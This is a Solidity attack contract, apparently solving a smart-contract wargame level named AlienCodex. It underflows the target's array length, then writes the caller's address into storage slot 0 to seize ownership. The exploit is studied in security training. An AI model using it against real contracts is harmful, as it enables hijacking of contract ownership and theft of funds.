// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IAlienCodex{

  function make_contact() external;

  function record(bytes32 _content) external;

  function retract() external;

  function revise(uint i, bytes32 _content) external; 
}

contract AlienCodexAttack {

    function attack(address target) external {
        IAlienCodex alienCodex = IAlienCodex(target);
        
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;

        bytes32 myAddress = bytes32(uint256(uint160(msg.sender)));

        alienCodex.make_contact();
        alienCodex.retract();
        alienCodex.revise(index, myAddress);
    }
}
